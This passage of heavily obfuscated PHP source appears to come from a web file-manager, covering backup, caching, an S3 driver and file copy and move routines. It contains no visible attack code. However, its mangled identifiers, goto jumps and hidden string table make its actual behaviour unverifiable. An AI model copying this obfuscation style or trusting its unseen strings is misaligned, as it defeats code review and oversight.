$Ñ†Ä‹õù = new DbManage(); $—“‰í’ = $Ñ†Ä‹õù->getSqlFile(); if (!$—“‰í’[$á„×Ë[869]] || !$—“‰í’[$á„×Ë[13]]) { Backup::log($á„×Ë[870]); return !1; } IO::move($—“‰í’[$á„×Ë[869]], $Öëîà§š); IO::move($—“‰í’[$á„×Ë[13]], $Öëîà§š); $Ó¦¤÷óà->end(); $ÇÛ†ÛÕó = array($á„×Ë[871] => $úñ‘‘·œ, $á„×Ë[872] => time()); Backup::set($ÇÛ†ÛÕó); return !0; } private function backupPath($‹àë¤Á¬) { $æ›á¤ò’ =& $_SERVER[°‰†òö¯]; $¶úÅš’ù = $‹àë¤Á¬[$æ›á¤ò’[32]]; $îàÛ òş = Model($æ›á¤ò’[831])->get($æ›á¤ò’[832]); $½›á½…¡ = substr(md5($æ›á¤ò’[833] . $îàÛ òş . $¶úÅš’ù), 0, 8); return "\x7b\x69\x6f\x3a{$‹àë¤Á¬[$æ›á¤ò’[813]]}\175\57\144\x61\x74\x61\x62\141\x73\145\57\x62\141\x63\153\165\160\57" . $¶úÅš’ù . $æ›á¤ò’[11] . $½›á½…¡; } private function tmpFilesPath() { $¿ƒê çË =& $_SERVER[°‰†òö¯]; $ØÆ§‡®€ = TEMP_FILES; if ($GLOBALS[$¿ƒê çË[6]][$¿ƒê çË[92]][$¿ƒê çË[859]]) { $ØÆ§‡®€ = $GLOBALS[$¿ƒê çË[6]][$¿ƒê çË[92]][$¿ƒê çË[859]]; if (!mk_dir($ØÆ§‡®€) || !is_writable($ØÆ§‡®€) || !IO::mkfile($ØÆ§‡®€ . $¿ƒê çË[860])) { $ØÆ§‡®€ = TEMP_FILES; } } return $ØÆ§‡®€; } } class BackupFile { public function __construct() { } public function index() { $ãÀóæŞí = Backup::get(); $ŒöĞû¦ç = $ãÀóæŞí[$_SERVER[°‰†òö¯][370]][$_SERVER[°‰†òö¯][232]][$_SERVER[°‰†òö¯][545]]; $ÕÇœ—³† = array($_SERVER[°‰†òö¯][546] => array($_SERVER[°‰†òö¯][873], $ŒöĞû¦ç), $_SERVER[°‰†òö¯][874] => array($_SERVER[°‰†òö¯][408], $ãÀóæŞí[$_SERVER[°‰†òö¯][813]])); $”òœÀŞÅ = (int) Model($_SERVER[°‰†òö¯][852])->where($ÕÇœ—³†)->count($_SERVER[°‰†òö¯][545]); $ş¼õ“ŒÖ = (int) Model($_SERVER[°‰†òö¯][852])->where($ÕÇœ—³†)->sum($_SERVER[°‰†òö¯][79]); $¹ƒßÚÀã = new TaskFileTransfer($_SERVER[°‰†òö¯][875], $_SERVER[°‰†òö¯][838], $”òœÀŞÅ, LNG($_SERVER[°‰†òö¯][847]) . $_SERVER[°‰†òö¯][848] . LNG($_SERVER[°‰†òö¯][876])); $¹ƒßÚÀã->task[$_SERVER[°‰†òö¯][824]] = $ş¼õ“ŒÖ; $×á£†ş = array($_SERVER[°‰†òö¯][877] => $”òœÀŞÅ, $_SERVER[°‰†òö¯][878] => $ş¼õ“ŒÖ, $_SERVER[°‰†òö¯][879] => time()); Backup::set($×á£†ş); $šîš¯“· = !0; $ááû£Ø  = $this->storeIds(); $îá³ŒÊ = 1; $ğ¹çŠ˜ö = 1000; $¥ùğÓ­î = $–£Áì‹† = 0; $¯°İÒƒ = array(); $´Ùõ‡¥ = $ğ à¾ÂÖ = 0; do { $ûÇç¬¥ = $_SERVER[°‰†òö¯][880]; $òÀ¿È¨™ = Model($_SERVER[°‰†òö¯][852])->where($ÕÇœ—³†)->field($ûÇç¬¥)->order($_SERVER[°‰†òö¯][881])->selectPage($ğ¹çŠ˜ö, $îá³ŒÊ); $Õõ‘ÖòÄ = !empty($òÀ¿È¨™[$_SERVER[°‰†òö¯][447]]) ? $òÀ¿È¨™[$_SERVER[°‰†òö¯][447]] : array(); foreach ($Õõ‘ÖòÄ as $ã¥‘ÙŞ÷) { if (!$this->_fileExist($ã¥‘ÙŞ÷, $¯°İÒƒ, $ááû£Ø )) { Backup::log($_SERVER[°‰†òö¯][882] . $ã¥‘ÙŞ÷[$_SERVER[°‰†òö¯][545]] . $_SERVER[°‰†òö¯][883] . $ã¥‘ÙŞ÷[$_SERVER[°‰†òö¯][87]]); continue; } $¸öšëÎ‡ = $ã¥‘ÙŞ÷[$_SERVER[°‰†òö¯][87]]; $Õ–¼™Šâ = "\x7b\x69\x6f\x3a{$ãÀóæŞí[$_SERVER[°‰†òö¯][813]]}\x7d" . substr($¸öšëÎ‡, strlen("\173\x69\x6f\x3a{$ã¥‘ÙŞ÷[$_SERVER[°‰†òö¯][884]]}\175")); if (IO::exist($Õ–¼™Šâ)) { $¹ƒßÚÀã->updateFileEnd($ã¥‘ÙŞ÷[$_SERVER[°‰†òö¯][32]], $ã¥‘ÙŞ÷[$_SERVER[°‰†òö¯][79]]); } else { $Õ–¼™Šâ = get_path_father($Õ–¼™Šâ); IO::mkdir($Õ–¼™Šâ); if (!IO::copy($¸öšëÎ‡, $Õ–¼™Šâ, $_SERVER[°‰†òö¯][885])) { Backup::log($_SERVER[°‰†òö¯][886] . $¸öšëÎ‡ . $_SERVER[°‰†òö¯][868] . $Õ–¼™Šâ . $_SERVER[°‰†òö¯][178]); $šîš¯“· = !1; break; } } $ŒöĞû¦ç = $ã¥‘ÙŞ÷[$_SERVER[°‰†òö¯][545]]; $–£Áì‹† += 1; $¥ùğÓ­î += $ã¥‘ÙŞ÷[$_SERVER[°‰†òö¯][79]]; $ğ à¾ÂÖ += 1; $´Ùõ‡¥ += $ã¥‘ÙŞ÷[$_SERVER[°‰†òö¯][79]]; if ($¥ùğÓ­î >= 1024 * 1024 * 100) { $×á£†ş = array($_SERVER[°‰†òö¯][812] => $ŒöĞû¦ç, $_SERVER[°‰†òö¯][887] => $ğ à¾ÂÖ, $_SERVER[°‰†òö¯][888] => $´Ùõ‡¥); Backup::set($×á£†ş); $¥ùğÓ­î = $–£Áì‹† = 0; } } $õ·û®™à = count($Õõ‘ÖòÄ); $îá³ŒÊ++; } while ($õ·û®™à == $ğ¹çŠ˜ö); $¹ƒßÚÀã->end(); $×á£†ş = array($_SERVER[°‰†òö¯][889] => 1, $_SERVER[°‰†òö¯][822] => time(), $_SERVER[°‰†òö¯][836] => 1, $_SERVER[°‰†òö¯][812] => $ŒöĞû¦ç, $_SERVER[°‰†òö¯][890] => time()); if ($–£Áì‹†) { $×á£†ş[$_SERVER[°‰†òö¯][887]] = $ğ à¾ÂÖ; $×á£†ş[$_SERVER[°‰†òö¯][888]] = $´Ùõ‡¥; } Backup::set($×á£†ş); return !0; } private function _fileExist($Çæœ¯şš, &$›äĞ»Ó, $èÑ©×ùØ) { $§ïôß“» =& $_SERVER[°‰†òö¯]; $º‹¹ƒ‰ = $Çæœ¯şš[$§ïôß“»[87]]; if (in_array($Çæœ¯şš[$§ïôß“»[545]], $›äĞ»Ó)) { return !1; } if (!in_array($Çæœ¯şš[$§ïôß“»[884]], $èÑ©×ùØ)) { return !1; } if (IO::exist($º‹¹ƒ‰)) { return !0; } $™¿¸Ñ’ = get_path_father($º‹¹ƒ‰); if (IO::exist($™¿¸Ñ’)) { $›äĞ»Ó[] = $Çæœ¯şš[$§ïôß“»[545]]; return !1; } $ïùôúŠŒ = array($§ïôß“»[884] => $Çæœ¯şš[$§ïôß“»[884]], $§ïôß“»[87] => array($§ïôß“»[461], "{$™¿¸Ñ’}\x25")); $ş¸’·ƒ = Model($§ïôß“»[852])->where($ïùôúŠŒ)->field($§ïôß“»[546])->select(); $›äĞ»Ó = array_merge($›äĞ»Ó, array_to_keyvalue($ş¸’·ƒ, $§ïôß“»[12], $§ïôß“»[545])); return !1; } private function _fileFilter($©•®Ç‹Ï) { $°éĞã¢® =& $_SERVER[°‰†òö¯]; return; if (empty($©•®Ç‹Ï)) { return; } $À×ôÇĞ = array($°éĞã¢®[545] => array($°éĞã¢®[7], array_unique($©•®Ç‹Ï))); $ÂªöÆ¨¢ = Model($°éĞã¢®[891])->where($À×ôÇĞ)->field($°éĞã¢®[193])->select(); foreach ($ÂªöÆ¨¢ as $œŒ³Óü) { Model($°éĞã¢®[891])->remove($œŒ³Óü[$°éĞã¢®[193]], !1); } } private function storeIds() { $º–Ç°‰è =& $_SERVER[°‰†òö¯]; $ÖŠ«šñ = Model($º–Ç°‰è[828])->listData(); $²½³ğØŞ = array(); $‰”œŠâó = $GLOBALS[$º–Ç°‰è[6]][$º–Ç°‰è[92]][$º–Ç°‰è[892]]; foreach ($ÖŠ«šñ as $š·¬ÒİÌ) { $àÓ‹çï„ = strtolower($š·¬ÒİÌ[$º–Ç°‰è[98]]); if (!isset($‰”œŠâó[$àÓ‹çï„])) { continue; } $‘Àó¥â£ = $º–Ç°‰è[77] . (isset($‰”œŠâó[$àÓ‹çï„]) ? $‰”œŠâó[$àÓ‹çï„] : ucfirst($àÓ‹çï„)); if (!class_exists($‘Àó¥â£)) { continue; } $²½³ğØŞ[] = $š·¬ÒİÌ[$º–Ç°‰è[477]]; } return $²½³ğØŞ; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $ùÔı‘Š˜ =& $_SERVER[°‰†òö¯]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $Æ­ó’‰” = $GLOBALS[$ùÔı‘Š˜[6]][$ùÔı‘Š˜[426]]; $ÂÏô×¿‘ = $Æ­ó’‰”[$Æ­ó’‰”[$ùÔı‘Š˜[893]]]; $³áÈşí€ = $Æ­ó’‰”[$ùÔı‘Š˜[894]]; switch ($Æ­ó’‰”[$ùÔı‘Š˜[893]]) { case $ùÔı‘Š˜[21]: self::$handle = Model($ùÔı‘Š˜[895]); break; case $ùÔı‘Š˜[896]: self::$handle = new CacheRedis($ÂÏô×¿‘, $³áÈşí€); break; case $ùÔı‘Š˜[897]: self::$handle = new CacheMemcached($ÂÏô×¿‘, $³áÈşí€); break; case $ùÔı‘Š˜[232]: self::$handle = new CacheFile($ÂÏô×¿‘, $³áÈşí€); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($·˜ÑØ³‡) { if (is_array($·˜ÑØ³‡) || is_object($·˜ÑØ³‡)) { $·˜ÑØ³‡ = json_encode($·˜ÑØ³‡); } $·˜ÑØ³‡ = rawurlencode($·˜ÑØ³‡); return md5(KOD_SITE_ID . $_SERVER[°‰†òö¯][11] . $·˜ÑØ³‡); } public static function get($õ ¶¹Ÿğ, $­Ñ•Ğ º = false) { $•×Ô¯Ôİ = self::key($õ ¶¹Ÿğ); $¬Ö£©½» = self::init(); if ($­Ñ•Ğ º) { return unserialize($¬Ö£©½»->get($•×Ô¯Ôİ)); } if (!isset(self::$memoryCache[$•×Ô¯Ôİ])) { $™Ûäõ‚Œ = $¬Ö£©½»->get($•×Ô¯Ôİ); self::$memoryCache[$•×Ô¯Ôİ] = unserialize($™Ûäõ‚Œ); } return self::$memoryCache[$•×Ô¯Ôİ]; } public static function set($¼¥ºÆüÈ, $ğã’Ú„, $¢ÄåÉşè = false) { $œ«ıİ¾ =& $_SERVER[°‰†òö¯]; $–ÛãÑŸÂ = self::key($¼¥ºÆüÈ); if (isset(self::$memoryCache[$–ÛãÑŸÂ]) && self::$memoryCache[$–ÛãÑŸÂ] === $ğã’Ú„) { return !0; } if ($¢ÄåÉşè === 0) { self::$memoryCache[$–ÛãÑŸÂ] = $ğã’Ú„; return !0; } $ãè¶–Ş‰ = self::init(); $Ü¶©à¦Â = serialize($ğã’Ú„); CacheLock::lock($¼¥ºÆüÈ . $œ«ıİ¾[898]); $Ö”èÇèñ = $ãè¶–Ş‰->set($–ÛãÑŸÂ, $Ü¶©à¦Â, $¢ÄåÉşè); self::$memoryCache[$–ÛãÑŸÂ] = $ğã’Ú„; CacheLock::unlock($¼¥ºÆüÈ . $œ«ıİ¾[898]); return $Ö”èÇèñ; } public static function getCall($…»¼¶Ûş, $æ˜ˆ‹òÊ, $ùÜ×™„ı, $éĞğÙ² = array()) { $®ÑĞ¸ó¤ =& $_SERVER[°‰†òö¯]; $ª›ó“æƒ = self::get($…»¼¶Ûş); if ($ª›ó“æƒ || $ª›ó“æƒ === $®ÑĞ¸ó¤[12]) { return $ª›ó“æƒ; } $ª›ó“æƒ = call_user_func_array($ùÜ×™„ı, $éĞğÙ²); $ª›ó“æƒ = $ª›ó“æƒ ? $ª›ó“æƒ : $®ÑĞ¸ó¤[12]; self::set($…»¼¶Ûş, $ª›ó“æƒ, $æ˜ˆ‹òÊ); return $ª›ó“æƒ; } public static function remove($¿Î—ÑĞ“) { $Ñ··¨©â = self::key($¿Î—ÑĞ“); unset(self::$memoryCache[$Ñ··¨©â]); self::clearTimeout(); CacheLock::lock($¿Î—ÑĞ“); $â¾åŠş® = self::init()->remove($Ñ··¨©â); CacheLock::unlock($¿Î—ÑĞ“); return $â¾åŠş®; } public static function removeMemory($¬Åú¸Û) { $ûÅ’ÕÉÔ = self::key($¬Åú¸Û); unset(self::$memoryCache[$ûÅ’ÕÉÔ]); } public static function clearMemory($ÓÁ¿ç§Ş = false) { if ($ÓÁ¿ç§Ş) { $ÓÁ¿ç§Ş = self::key($ÓÁ¿ç§Ş); unset(self::$memoryCache[$ÓÁ¿ç§Ş]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[°‰†òö¯][899])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[°‰†òö¯][900])) { self::init()->clearTimeout(); } } } goto A¯‰÷÷é§õ; d©–Â«ø±Ğ: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($–¿€çí) { $ÊùÎœÀ =& $_SERVER[°‰†òö¯]; parent::__construct($–¿€çí); $…ğ£À = isset($–¿€çí[$ÊùÎœÀ[258]]) && $–¿€çí[$ÊùÎœÀ[258]] == $ÊùÎœÀ[249] ? $ÊùÎœÀ[249] : $ÊùÎœÀ[315]; $this->setSignVersion($…ğ£À); } public function link($„ÜŞßÏ, $‚ñ”Ëç = array()) { return parent::link($„ÜŞßÏ, $‚ñ”Ëç); } public function fileOut($òÑÏâÄ, $ù½Œ±´Ò = false, $ÕÍ‡¨şŒ = false, $Ü£ûÂ± = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[°‰†òö¯][316])) { return parent::fileOutServer($òÑÏâÄ, $ù½Œ±´Ò, $ÕÍ‡¨şŒ, $Ü£ûÂ±); } parent::fileOut($òÑÏâÄ, $ù½Œ±´Ò, $ÕÍ‡¨şŒ, $Ü£ûÂ±); } public function fileOutImage($°Ê²ş¹Õ, $éŒ÷Œ€’ = 250) { if (strstr($this->endpoint, $_SERVER[°‰†òö¯][316])) { return parent::fileOutImageServer($°Ê²ş¹Õ, $éŒ÷Œ€’); } parent::fileOutImage($°Ê²ş¹Õ, $éŒ÷Œ€’); } public function fileOutLink($’ÇÛÛŠş) { $àš×öå¬ =& $_SERVER[°‰†òö¯]; if (substr($’ÇÛÛŠş, 0, 7) == $àš×öå¬[218]) { $’ÇÛÛŠş = $àš×öå¬[219] . substr($’ÇÛÛŠş, 7); } header($àš×öå¬[175] . $’ÇÛÛŠş); die; } } define($_SERVER[°‰†òö¯][317], 1); define($_SERVER[°‰†òö¯][318], 2); goto C«ÕçÖÉ×»; aó‰í®ø†: class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($èÇ´¶¼Ü, $—®½·Õ) { $ıùÛ¯š› =& $_SERVER[°‰†òö¯]; $¸Ç‡Ã×Ó = $—®½·Õ; $GLOBALS[$ıùÛ¯š›[1225]] = $ıùÛ¯š›[1226] . $èÇ´¶¼Ü; Hook::trigger($ıùÛ¯š›[1226] . $èÇ´¶¼Ü . $ıùÛ¯š›[1227], $¸Ç‡Ã×Ó); $‡·ÛÂï = self::driverMake($—®½·Õ[0]); if (!$‡·ÛÂï) { return !1; } if (method_exists($‡·ÛÂï, $èÇ´¶¼Ü)) { $¦ÌÏñÊ = @call_user_func_array(array($‡·ÛÂï, $èÇ´¶¼Ü), $—®½·Õ); } else { if (method_exists($‡·ÛÂï, $ıùÛ¯š›[1228])) { $¦ÌÏñÊ = @call_user_func_array(array($‡·ÛÂï, $èÇ´¶¼Ü), $—®½·Õ); } else { if (method_exists(self, $èÇ´¶¼Ü)) { $¦ÌÏñÊ = @call_user_func_array(array(self, $èÇ´¶¼Ü), $—®½·Õ); } else { $¦ÌÏñÊ = call_user_func_array(array(parent, $èÇ´¶¼Ü), $—®½·Õ); } } } Hook::trigger($ıùÛ¯š›[1226] . $èÇ´¶¼Ü . $ıùÛ¯š›[1229], $¸Ç‡Ã×Ó, $¦ÌÏñÊ); return $¦ÌÏñÊ; } public static function init($ç˜‚§üµ) { return self::driverMake($ç˜‚§üµ); } public static function copy($˜äË¨…ç, $ğƒù³”Ñ, $†µÛ’Š’ = false, $¯¥×çñ = false) { return self::copyMoveStart($˜äË¨…ç, $ğƒù³”Ñ, $†µÛ’Š’, $_SERVER[°‰†òö¯][625], $¯¥×çñ); } public static function move($¸“³™Êº, $›“ªğàÆ, $ã¤±‡Â— = false, $µãØôşÅ = false) { return self::copyMoveStart($¸“³™Êº, $›“ªğàÆ, $ã¤±‡Â—, $_SERVER[°‰†òö¯][627], $µãØôşÅ); } public static function copyMoveChildren($¯ü„ßõ, $Ù»‰ˆ´ê, $ÊÇÚòÙÚ = "\x63\x6f\160\x79", $úõ¬•‰ = REPEAT_REPLACE) { $å„öøãÙ =& $_SERVER[°‰†òö¯]; $“£²“ùÆ = $¯ü„ßõ; $ıäÀİ¥‡ = self::driverMake($¯ü„ßõ); $ĞøË­­Ö = $ıäÀİ¥‡->listPath($¯ü„ßõ, !0); $Ê‚²Ñù = array_merge($ĞøË­­Ö[$å„öøãÙ[86]], $ĞøË­­Ö[$å„öøãÙ[85]]); foreach ($Ê‚²Ñù as $Îé…ƒŠÄ) { self::copyMoveStart($Îé…ƒŠÄ[$å„öøãÙ[87]], $Ù»‰ˆ´ê, $úõ¬•‰, $ÊÇÚòÙÚ, !1); } if ($ÊÇÚòÙÚ == $å„öøãÙ[627]) { self::remove($“£²“ùÆ); } } private static function copyMoveStart($ä¿²’«, $Ì¹øĞÅõ, $•Ş Ç‹, $¼¡­€÷Á, $Âˆ Ÿ¼ó) { $ÏÈÈ¸×Ä =& $_SERVER[°‰†òö¯]; $Ã¡íòÕÇ = array($ä¿²’«, $Ì¹øĞÅõ, $•Ş Ç‹, $Âˆ Ÿ¼ó); Hook::trigger($ÏÈÈ¸×Ä[1226] . $¼¡­€÷Á . $ÏÈÈ¸×Ä[1227], $Ã¡íòÕÇ); $‘ùí’ú® = self::copyMove($ä¿²’«, $Ì¹øĞÅõ, $•Ş Ç‹, $¼¡­€÷Á, $Âˆ Ÿ¼ó); Hook::trigger($ÏÈÈ¸×Ä[1226] . $¼¡­€÷Á . $ÏÈÈ¸×Ä[1229], $Ã¡íòÕÇ, $‘ùí’ú®); return $‘ùí’ú®; } public static function saveFile($”ã¿íå, $Õ“ï€­°, $ĞŒ†›çù = true) { $Ãïœ® =& $_SERVER[°‰†òö¯]; $ÓîØôúš = self::info($Õ“ï€­°); $Ò·õé© = self::driverMake($”ã¿íå); $È·Ò©Ë… = self::driverMake($Õ“ï€­°); $®ğÇó¶Ë = !1; if ($È·Ò©Ë…->pathParse[$Ãïœ®[1230]]) { $®ğÇó¶Ë = $È·Ò©Ë…; $Æó£É‡ê = $È·Ò©Ë…->pathParse[$Ãïœ®[1230]]; $È·Ò©Ë… = self::driverMake($Æó£É‡ê); } if ($Ò·õé©->pathParse[$Ãïœ®[1230]]) { $ìêùİ·Ò = $Ò·õé©->pathParse[$Ãïœ®[1230]]; $Ò·õé© = self::driverMake($ìêùİ·Ò); } $‚ª€§µ = $È·Ò©Ë…->pathFather($Õ“ï€­°); $ô‘ú°–¡ = !0; if (!$ĞŒ†›çù && self::driverIsSame($Ò·õé©, $È·Ò©Ë…)) { $ô‘ú°–¡ = !1; } $ç°¢¢™È = self::copyFile($Ò·õé©, $”ã¿íå, $È·Ò©Ë…, $‚ª€§µ, $ÓîØôúš[$Ãïœ®[32]], $ô‘ú°–¡); if ($®ğÇó¶Ë) { $ç°¢¢™È = $®ğÇó¶Ë->getPathOuter($ç°¢¢™È); } return $ç°¢¢™È; } private static function copyMove($ıÃÎœú, $¯ÛÇƒ®ª, $‹¾æ¼¶ò, $óàßİöµ, $Ùğ¼Ü’ = false) { $Œ´Ÿƒô  =& $_SERVER[°‰†òö¯]; if (!$ıÃÎœú || $ıÃÎœú == $Œ´Ÿƒô [8] || !$¯ÛÇƒ®ª) { return !1; } ignore_timeout(); $ĞùÌ“¬„ = self::driverMake($ıÃÎœú); $¼Áñí˜ç = self::driverMake($¯ÛÇƒ®ª); $§ª–½³© = $óàßİöµ == $Œ´Ÿƒô [627]; $ş©Šâô = !1; if ($¼Áñí˜ç->pathParse[$Œ´Ÿƒô [1230]]) { $ş©Šâô = $¼Áñí˜ç; $¯ÛÇƒ®ª = $¼Áñí˜ç->pathParse[$Œ´Ÿƒô [1230]]; $¼Áñí˜ç = self::driverMake($¯ÛÇƒ®ª); } if ($ĞùÌ“¬„->pathParse[$Œ´Ÿƒô [1230]]) { $ıÃÎœú = $ĞùÌ“¬„->pathParse[$Œ´Ÿƒô [1230]]; $ĞùÌ“¬„ = self::driverMake($ıÃÎœú); } self::check($ĞùÌ“¬„, $ıÃÎœú, $¼Áñí˜ç, $¯ÛÇƒ®ª); Hook::trigger($Œ´Ÿƒô [1231], $ĞùÌ“¬„, $ıÃÎœú, $¼Áñí˜ç, $¯ÛÇƒ®ª); $í®òõ›Ï = self::driverIsSame($ĞùÌ“¬„, $¼Áñí˜ç); if ($í®òõ›Ï) { if ($óàßİöµ == $Œ´Ÿƒô [627] && !method_exists($¼Áñí˜ç, $Œ´Ÿƒô [1232]) && trim($¯ÛÇƒ®ª, $Œ´Ÿƒô [8]) == trim($¼Áñí˜ç->pathFather($ıÃÎœú), $Œ´Ÿƒô [8])) { if ($ĞùÌ“¬„->pathThis($ıÃÎœú) != $Ùğ¼Ü’ && !$ĞùÌ“¬„->isOsDriver()) { return $ĞùÌ“¬„->rename($ıÃÎœú, $Ùğ¼Ü’); } return $¼Áñí˜ç->getPathOuter($ıÃÎœú); } if (method_exists($¼Áñí˜ç, $óàßİöµ)) { return $¼Áñí˜ç->{$óàßİöµ}($ıÃÎœú, $¯ÛÇƒ®ª, $‹¾æ¼¶ò, $Ùğ¼Ü’); } } if ($í®òõ›Ï && $óàßİöµ == $Œ´Ÿƒô [627] && $¼Áñí˜ç->getType() == $Œ´Ÿƒô [109]) { $òÔ¤ëö = $¼Áñí˜ç->movePath($ıÃÎœú, $¯ÛÇƒ®ª, $Ùğ¼Ü’); if ($òÔ¤ëö) { return $òÔ¤ëö; } } $£Ìø “ = $ĞùÌ“¬„->isFile($ıÃÎœú); if (!$£Ìø “ && $¼Áñí˜ç->getType() == $Œ´Ÿƒô [818] && $ĞùÌ“¬„->getType() == $Œ´Ÿƒô [109]) { $òÔ¤ëö = $¼Áñí˜ç->copyFolderFromIO($ĞùÌ“¬„, $ıÃÎœú, $¯ÛÇƒ®ª, $‹¾æ¼¶ò, $§ª–½³©, $Ùğ¼Ü’); } else { $òÔ¤ëö = self::copyPath($ĞùÌ“¬„, $ıÃÎœú, $¼Áñí˜ç, $¯ÛÇƒ®ª, $‹¾æ¼¶ò, $§ª–½³©, $£Ìø “, $Ùğ¼Ü’); } if ($òÔ¤ëö && $§ª–½³©) { $ĞùÌ“¬„->remove($ıÃÎœú); } if ($ş©Šâô) { $òÔ¤ëö = $ş©Šâô->getPathOuter($òÔ¤ëö); } return $òÔ¤ëö; } private static function check($‰–ñÈ„, $¦Äø°¤í, $éêãÏ™®, &$ˆî‡À¯Õ) { $°Ôüİšµ =& $_SERVER[°‰†òö¯]; if (self::driverIsSame($‰–ñÈ„, $éêãÏ™®) && $‰–ñÈ„->isFolder($¦Äø°¤í) && $‰–ñÈ„->isParentOf($¦Äø°¤í, $ˆî‡À¯Õ)) { show_json(LNG($°Ôüİšµ[1233]), !1); } if (!$‰–ñÈ„->exist($¦Äø°¤í)) { show_json(LNG($°Ôüİšµ[108]), !1); } } private static function copyPath($Ş…¦ÔÈÍ, $±ßÂè†», $Æ¨Ò·¹ú, $Ë¤»Ö„, $ä‡»”Ø, $Ïí¬›àñ, $Ÿññ«˜ , $üó¹¹Óä = false, $›ÊÉâá = true) { $¥¬¯ğ‚ë =& $_SERVER[°‰†òö¯]; $¯ÆÂÉÇŠ = empty($üó¹¹Óä) && $üó¹¹Óä !== $¥¬¯ğ‚ë[230] ? $Ş…¦ÔÈÍ->pathThis($±ßÂè†») : $üó¹¹Óä; if ($ä‡»”Ø) { $‘ß­ıÃ‰ = $Æ¨Ò·¹ú->fileNameExist($Ë¤»Ö„, $¯ÆÂÉÇŠ); $å›Ğö†Ç = $¯ÆÂÉÇŠ; $¯ÆÂÉÇŠ = $Æ¨Ò·¹ú->fileNameAuto($Ë¤»Ö„, $¯ÆÂÉÇŠ, $ä‡»”Ø, !$Ÿññ«˜ ); if (!$‘ß­ıÃ‰ || $å›Ğö†Ç != $¯ÆÂÉÇŠ) { $ä‡»”Ø = !1; } if ($›ÊÉâá && !$ä‡»”Ø) { $Æ¨Ò·¹ú->_data[$¥¬¯ğ‚ë[1234]] = !0; } } if ($Ÿññ«˜ ) { return self::copyFile($Ş…¦ÔÈÍ, $±ßÂè†», $Æ¨Ò·¹ú, $Ë¤»Ö„, $¯ÆÂÉÇŠ, $Ïí¬›àñ); } if ($ä‡»”Ø == REPEAT_RENAME_FOLDER) { $ä‡»”Ø = !1; } $Àõ¢¹ˆ = rtrim($Ë¤»Ö„, $¥¬¯ğ‚ë[8]) . $¥¬¯ğ‚ë[8] . $¯ÆÂÉÇŠ; $µéœ²Î­ = $Æ¨Ò·¹ú->mkdir($Æ¨Ò·¹ú->getPath($Àõ¢¹ˆ), $ä‡»”Ø); $Ë¤»Ö„ = $Æ¨Ò·¹ú->getPathInner($µéœ²Î­); $ìƒÍşÆ = $Ş…¦ÔÈÍ->listPath($±ßÂè†», !0); $ìƒÍşÆ = is_array($ìƒÍşÆ) ? $ìƒÍşÆ : array($¥¬¯ğ‚ë[86] => array(), $¥¬¯ğ‚ë[85] => array()); $”ÉÒ²Ä = array_merge($ìƒÍşÆ[$¥¬¯ğ‚ë[86]], $ìƒÍşÆ[$¥¬¯ğ‚ë[85]]); foreach ($”ÉÒ²Ä as $æı‚ğ ˜) { $ÕÙÃ§éÉ = $æı‚ğ ˜[$¥¬¯ğ‚ë[33]] == $¥¬¯ğ‚ë[232]; $±ßÂè†» = $Ş…¦ÔÈÍ->getPathInner($æı‚ğ ˜[$¥¬¯ğ‚ë[87]]); $Îæœ¤ï– = self::copyPath($Ş…¦ÔÈÍ, $±ßÂè†», $Æ¨Ò·¹ú, $Ë¤»Ö„, $ä‡»”Ø, $Ïí¬›àñ, $ÕÙÃ§éÉ, !1, !1); if (!$Îæœ¤ï–) { IO::errorTips($¥¬¯ğ‚ë[1235] . $±ßÂè†» . $¥¬¯ğ‚ë[73] . $Ë¤»Ö„); } } self::copyMoveKeepInfo($Ş…¦ÔÈÍ, $±ßÂè†», $µéœ²Î­); return $µéœ²Î­; } private static function copyFile($¯úâ€¶ü, $Å €„¢ê, $ÓÛÜíÑë, $ §´ƒ Ê, $²ÅË•Ÿ­, $ÇòœÙ‡) { $ÓÕ«°¿· =& $_SERVER[°‰†òö¯]; $ §´ƒ Ê = $ÓÛÜíÑë->getPath(rtrim($ §´ƒ Ê, $ÓÕ«°¿·[8]) . $ÓÕ«°¿·[8] . $²ÅË•Ÿ­); $ÖØ—Æûé = $ÓÕ«°¿·[1236] . time() . rand_string(5); Hook::trigger($ÓÕ«°¿·[1237], $¯úâ€¶ü, $Å €„¢ê, $ÓÛÜíÑë, $ §´ƒ Ê, $²ÅË•Ÿ­, $ÖØ—Æûé); if (self::driverIsSame($¯úâ€¶ü, $ÓÛÜíÑë)) { if ($ÇòœÙ‡) { $‚£ôŒªá = $ÓÛÜíÑë->moveFile($Å €„¢ê, $ §´ƒ Ê); } else { $‚£ôŒªá = $ÓÛÜíÑë->copyFile($Å €„¢ê, $ §´ƒ Ê); } Hook::trigger($ÓÕ«°¿·[1238], $¯úâ€¶ü, $Å €„¢ê, $ÓÛÜíÑë, $ §´ƒ Ê, $²ÅË•Ÿ­, $‚£ôŒªá); self::copyMoveKeepInfo($¯úâ€¶ü, $Å €„¢ê, $‚£ôŒªá); return $‚£ôŒªá; } $îÁÊ™¿· = TEMP_FILES; if ($GLOBALS[$ÓÕ«°¿·[6]][$ÓÕ«°¿·[92]][$ÓÕ«°¿·[859]]) { $îÁÊ™¿· = $GLOBALS[$ÓÕ«°¿·[6]][$ÓÕ«°¿·[92]][$ÓÕ«°¿·[859]]; } $ˆİı©ğˆ = $îÁÊ™¿·; mk_dir($ˆİı©ğˆ); $è©ÌêÙ– = $ˆİı©ğˆ . $ÖØ—Æûé; $Ï¨¾¸Ñ = $è©ÌêÙ–; $è©ÌêÙ– = $¯úâ€¶ü->download($Å €„¢ê, $è©ÌêÙ–); $è©ÌêÙ– = $¯úâ€¶ü->iconvApp($è©ÌêÙ–); if (substr($è©ÌêÙ–, strlen($îÁÊ™¿·)) == $îÁÊ™¿·) { $ÇòœÙ‡ = !0; } $‚£ôŒªá = $ÓÛÜíÑë->upload($ §´ƒ Ê, $è©ÌêÙ–, $ÇòœÙ‡); self::remove($Ï¨¾¸Ñ); Hook::trigger($ÓÕ«°¿·[1238], $¯úâ€¶ü, $Å €„¢ê, $ÓÛÜíÑë, $ §´ƒ 